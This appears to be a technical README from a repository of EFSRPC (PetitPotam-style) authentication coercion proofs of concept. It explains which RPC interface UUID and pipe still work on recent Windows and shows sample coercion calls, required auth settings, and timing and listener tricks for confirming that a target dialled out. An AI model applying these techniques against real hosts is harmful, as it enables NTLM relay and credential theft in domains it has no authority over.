# MS-EFSR: the two interface UUIDs, and why the classic one fails on recent Windows

## TL;DR

MS-EFSR is registered under **two** RPC interface UUIDs, each paired with its own well-known
endpoint ([MS-EFSR] 1.9 Standards Assignments):

| RPC well-known endpoint | RPC interface UUID | Availability |
|---|---|---|
| `\pipe\lsarpc` | `c681d488-d850-11d0-8c52-00c04fd90f7e` | **Removed** in Windows 11 v22H2 and later, and Windows Server 2022 23H2 and later |
| `\pipe\efsrpc` | `df1941c5-fe89-4e79-bf10-463657acf44d` | Still present |

So on an up-to-date host, a PoC that binds `c681d488-…` — the UUID every PetitPotam-era tool
uses — is rejected at **bind time**, before any coercion is attempted:

```
[>] Binding to <uuid='c681d488-d850-11d0-8c52-00c04fd90f7e', version='1.0'> ... fail
[!] Something went wrong, check error status => Bind context 1 rejected: provider_rejection; abstract_syntax_not_supported
```

The fix is to fall back to `df1941c5-fe89-4e79-bf10-463657acf44d` over `\pipe\efsrpc`. The method
set is the same, so the coercion works unchanged — only the interface UUID and endpoint differ.

## Measured on Windows Server 2025

Bind matrix against a Windows Server 2025 domain controller (2026-09-09), authenticated as a
local administrator, RPC auth `RPC_C_AUTHN_WINNT` + `RPC_C_AUTHN_LEVEL_PKT_PRIVACY`:

| SMB pipe | `c681d488-…` (classic) | `df1941c5-…` | `04eeb297-…` (EfsK) |
|---|---|---|---|
| `\PIPE\efsrpc` | bind rejected: `abstract_syntax_not_supported` | **bind OK, calls work** | bind OK |
| `\PIPE\lsarpc` | bind rejected: `abstract_syntax_not_supported` | bind OK, **calls fault `nca_s_unk_if`** | bind OK |
| `\PIPE\netlogon` | bind rejected: `abstract_syntax_not_supported` | bind OK, **calls fault `nca_s_unk_if`** | bind OK |
| `\PIPE\samr` | bind rejected: `abstract_syntax_not_supported` | bind OK, **calls fault `nca_s_unk_if`** | bind OK |
| `\PIPE\lsass` | bind rejected: `abstract_syntax_not_supported` | bind OK, **calls fault `nca_s_unk_if`** | bind OK |

The classic UUID is not registered on *any* pipe, and only `\pipe\efsrpc` actually dispatches
EFSRPC calls. Alongside it, the EFS service registers a second, undocumented interface named
**EfsK** (`04eeb297-cbf4-466b-8a2a-bfd6a2f10bba`, "EFSK RPC Interface") on the same endpoint.

With the right UUID, `EfsRpcEncryptFileSrv` (opnum 4) coerces exactly as before:

```
[+] bound      df1941c5-fe89-4e79-bf10-463657acf44d v1.0
[>] EfsRpcEncryptFileSrv(FileName='\\192.168.2.51\share\file.txt')
[i] returned: SessionError: code: 0x35 - ERROR_BAD_NETPATH - The network path was not found.
```

`ERROR_BAD_NETPATH` is the expected result — the target has to reach the UNC path before it can
report that it cannot. Where you cannot listen on port 445, the round-trip time of the *first*
call against a given UNC path is itself evidence that the target really dialled out: ~11 s when
the listener IP refuses the connection (TCP RST) versus ~21 s for a black-holed IP. Repeat calls
to the same path return `ERROR_BAD_NETPATH` immediately, served from the redirector's negative
cache — so time a fresh listener IP, and always confirm the coercion on a listener
([Responder](https://github.com/lgandx/Responder), `ntlmrelayx`) rather than on the return code.

## Three other things that bite on recent Windows

1. **A successful bind is not proof the interface is there.** `\lsarpc`, `\lsass`, `\netlogon`
   and `\samr` are all aliases served by lsass, and they accept a `df1941c5-…` bind and then
   fault every call with `nca_s_unk_if`. Only `\pipe\efsrpc` dispatches. Do not conclude from a
   clean bind that a host is vulnerable — issue the call.

2. **Packet privacy is mandatory.** Since the [MSFT-CVE-2021-43893] update, "Windows EFSRPC
   servers require the `RPC_C_AUTHN_LEVEL_PKT_PRIVACY` RPC authentication level on all EFSRPC
   methods" ([MS-EFSR] Appendix B, notes &lt;5&gt; and &lt;32&gt;). An association that is
   authenticated at the SMB layer but bound anonymously at the RPC layer binds fine and then
   answers opnum 4 with `nca_s_fault_access_denied`. In impacket, set
   `set_auth_type(RPC_C_AUTHN_WINNT)` and `set_auth_level(RPC_C_AUTHN_LEVEL_PKT_PRIVACY)`.

3. **No null session.** Opening `\pipe\efsrpc` anonymously returns `STATUS_ACCESS_DENIED`, and
   per [MS-EFSR] Appendix B note &lt;38&gt;, after [MSFT-CVE-2022-26925] a null-session client
   calling these methods over lsarpc gets `RPC_S_ACCESS_DENIED`. These coercion methods need
   valid credentials — any domain user is enough.

For completeness, the older PetitPotam hardening is also documented in the same appendix: per
note &lt;42&gt;, on Windows Server 2008 through 2022 and Windows 7 through 11 with
[MSFT-CVE-2021-36942], `EfsRpcOpenFileRaw` over `\pipe\lsarpc` returns `ERROR_ACCESS_DENIED` —
which is why opnum 0 died first while the other opnums kept working.

## What this means for the PoCs in this repository

Each PoC binds the classic UUID first (the technique as originally documented) and, if the bind
is rejected, retries with `df1941c5-fe89-4e79-bf10-463657acf44d` on `\pipe\efsrpc`. A rejected
bind leaves the association unusable, so the retry needs a fresh pipe and a fresh bind.

## References

+ [MS-EFSR] 1.9 Standards Assignments — both interface UUIDs and their well-known endpoints:
  [https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-efsr/1baaad2f-7a84-4238-b113-f32827a39cd2](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-efsr/1baaad2f-7a84-4238-b113-f32827a39cd2)

+ [MS-EFSR] 2.1 Transport — servers listen on both `\pipe\lsarpc` and `\pipe\efsrpc`:
  [https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-efsr/ab3c0be4-5b55-4a08-b198-f17170100be6](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-efsr/ab3c0be4-5b55-4a08-b198-f17170100be6)

+ [MS-EFSR] Appendix B: Product Behavior — note &lt;3&gt; (the `\pipe\lsarpc` endpoint is not
  available in Windows 11 v22H2 and later and Windows Server 2022 23H2 and later), notes &lt;4&gt;,
  &lt;34&gt;, &lt;36&gt; (same, for the transport and interface sections), notes &lt;5&gt; and
  &lt;32&gt; (`RPC_C_AUTHN_LEVEL_PKT_PRIVACY` required on all methods), note &lt;38&gt; (null
  session denied), note &lt;42&gt; (`EfsRpcOpenFileRaw` over lsarpc returns `ERROR_ACCESS_DENIED`):
  [https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-efsr/cecd911d-7105-45cc-a7c8-348335d6f03f](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-efsr/cecd911d-7105-45cc-a7c8-348335d6f03f)

+ [MS-EFSR] 3.1.4.2 EFSRPC Interface — the method/opnum table shared by both interfaces:
  [https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-efsr/403c7ae0-1a3a-4e96-8efc-54e79a2cc451](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-efsr/403c7ae0-1a3a-4e96-8efc-54e79a2cc451)

+ [MSFT-CVE-2021-36942] — Windows LSA spoofing / PetitPotam hardening:
  [https://go.microsoft.com/fwlink/?linkid=2169361](https://go.microsoft.com/fwlink/?linkid=2169361)

+ [MSFT-CVE-2021-43893] — the update that made packet privacy mandatory on EFSRPC:
  [https://go.microsoft.com/fwlink/?linkid=2183237](https://go.microsoft.com/fwlink/?linkid=2183237)

+ [MSFT-CVE-2022-26925] — null-session EFSRPC over lsarpc denied:
  [https://go.microsoft.com/fwlink/?linkid=2201451](https://go.microsoft.com/fwlink/?linkid=2201451)

+ PetitPotam, the original EFSRPC coercion tool (classic UUID only):
  [https://github.com/topotam/PetitPotam](https://github.com/topotam/PetitPotam)
